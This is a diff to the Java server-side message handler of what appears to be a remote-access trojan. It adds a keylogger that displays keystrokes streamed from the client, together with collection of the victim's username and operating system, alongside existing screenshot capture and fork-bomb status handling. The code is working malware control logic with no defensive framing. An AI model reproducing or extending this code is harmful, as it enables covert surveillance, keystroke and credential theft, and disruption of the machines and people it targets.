@@ -1,11 +1,11 @@
 package utils;
 
+import app.Server;
 import network.ClientConnection;
-import network.Message;
 
 import javax.imageio.ImageIO;
-import javax.swing.JFrame;
-import java.awt.Graphics2D;
+import javax.swing.*;
+import java.awt.*;
 import java.awt.event.WindowAdapter;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
@@ -17,12 +17,22 @@ import static utils.ServerUtils.print;
 public class ServerMessageHandler {
 
     private static JFrame sharedScreen;
+    private static TextScreen keylogScreen;
 
     public static void handleIncomingMessage(Message message, ClientConnection c) {
 
         switch (message.getCommand()) {
             case "screen":
                 receiveScreenshot(message);
+                break;
+
+            case "username":
+                String name = (String) message.getArguments().get(0);
+                Server.addUserSystemName(c, name);
+                break;
+            case "os":
+                String os = (String) message.getArguments().get(0);
+                Server.addUserOS(c, os);
                 break;
             case "print":
                 print(message.getArguments().get(0));
@@ -32,6 +42,10 @@ public class ServerMessageHandler {
                 break;
             case "bomb-fail":
                 System.out.println("Fork Bomb failed: " + message.getArguments().get(0));
+                break;
+            case "key-typed":
+                NativeKeyEvent keyTyped = (NativeKeyEvent) message.getArguments().get(0);
+                receiveKeyTyped(keyTyped, c);
                 break;
         }
 
@@ -48,12 +62,30 @@ public class ServerMessageHandler {
                     e.getWindow().dispose();
                     c.getConnection().sendMessage(new Message("stop-screenshare"));
                     sharedScreen = null;
-                    System.out.println("JFrame Closed!");
+                    System.out.println("Screenshare Closed!");
                 }
             });
         }
 
         putImageFromMessage(sharedScreen, message);
+    }
+
+    static void receiveKeyTyped(NativeKeyEvent event, ClientConnection c) {
+        if(keylogScreen == null) {
+            keylogScreen = new TextScreen();
+            keylogScreen.addWindowListener(new WindowAdapter() {
+                @Override
+                public void windowClosing(java.awt.event.WindowEvent e) {
+                    System.out.println("Fechou o jovem");
+                    e.getWindow().dispose();
+                    c.getConnection().sendMessage(new Message("stop-keylogger"));
+                    keylogScreen = null;
+                    System.out.println("Keylogger Closed!");
+                }
+            });
+        }
+        // TODO mudar
+        keylogScreen.append(event.getKeyChar() + "");
     }
 
     static void receiveScreenshot(Message message) {
@@ -82,7 +114,8 @@ public class ServerMessageHandler {
 
             window.add(image);
             window.update(image.getGraphics());
-            window.setVisible(true);
+//            window.pack();
+//            window.setVisible(true);
         } catch (Exception e) {
             e.printStackTrace();
         }
